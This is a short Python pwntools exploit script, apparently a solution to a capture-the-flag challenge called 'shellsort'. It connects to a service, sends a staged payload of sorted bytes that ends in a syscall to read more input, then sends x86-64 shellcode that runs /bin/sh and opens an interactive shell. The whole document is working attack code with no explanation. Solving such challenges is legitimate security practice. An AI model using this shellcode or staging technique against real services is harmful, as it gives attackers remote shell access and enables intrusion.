from pwn import *

# r = remote("csie.ctf.tw", 10121)
r = remote("127.0.0.1", 8888)
# r = process("./shellsort")
context.arch = "amd64"

payload = '\x90' * 0x1861 + '\x5e' * 0x3c8 + '\x5a' * 0x5 + '\x0f\x05'
r.send(payload)

sc = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
r.send(sc)

r.interactive()

